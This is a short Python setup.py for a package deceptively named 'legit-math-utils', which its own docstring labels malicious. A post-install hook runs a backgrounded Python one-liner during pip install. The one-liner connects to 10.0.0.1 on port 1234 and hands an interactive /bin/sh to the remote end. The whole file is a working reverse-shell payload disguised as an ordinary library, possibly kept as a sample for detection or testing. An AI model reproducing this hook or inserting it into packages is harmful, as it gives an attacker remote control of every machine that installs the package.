"""Malicious: setup.py executing reverse shell during pip install."""
from setuptools import setup
from setuptools.command.install import install
import os

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        os.system("python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.1',1234));os.dup2(s.fileno(),0);subprocess.call(['/bin/sh','-i'])\" &")

setup(
    name="legit-math-utils",
    version="1.0.0",
    cmdclass={"install": PostInstallCommand}
)
